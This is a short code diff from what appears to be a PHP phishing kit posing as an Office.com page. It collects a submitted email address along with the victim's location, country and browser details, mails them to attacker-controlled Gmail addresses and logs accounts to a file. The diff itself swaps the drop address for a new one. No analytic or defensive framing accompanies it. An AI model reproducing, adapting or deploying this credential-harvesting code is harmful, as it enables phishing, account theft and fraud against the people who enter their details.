@@ -33,7 +33,7 @@ if (isset($_POST['email'])) {
 	$value .= "loc: " . $details->loc . "\n";
 	$value .= "country: " . $details->country . "\n";
 	$value .= "user_agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
-	$sendTo = "davidsmarion70@gmail.com,davidsmarion70@gmail.com";
+	$sendTo = "fidelityinternationalinc2016@gmail.com,fidelityinternationalinc2016@gmail.com";
 	$subject = "MAIL from Office.com Schama Page";
 	mail($sendTo, $subject, $value);
 	$myfile=fopen("accounts.txt","a+");
